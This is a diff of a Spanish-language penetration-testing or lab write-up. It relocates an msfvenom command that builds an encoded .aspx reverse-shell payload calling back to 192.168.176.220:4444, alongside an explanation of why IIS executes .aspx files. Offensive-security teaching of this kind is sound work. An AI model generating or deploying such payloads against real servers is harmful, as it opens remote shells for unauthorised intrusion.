@@ -41,11 +41,10 @@ Confirmamos que el servidor está expuesto, por lo que podemos generar un payloa
 
 ## ¿Por qué generar un payload en `.aspx`?
 
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x64/shikata_ga_nai -f aspx -o shell.aspx
-```
-
-
 Utilizamos la extensión `.aspx` porque el servidor web está ejecutando IIS con soporte para ASP.NET. A diferencia de un archivo .exe, IIS puede procesar directamente un archivo .aspx, permitiendo ejecutar código en el contexto del servidor.
 
 ## Generación del payload con `MSFVENOM` en .aspx 
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x64/shikata_ga_nai -f aspx -o shell.aspx
+```
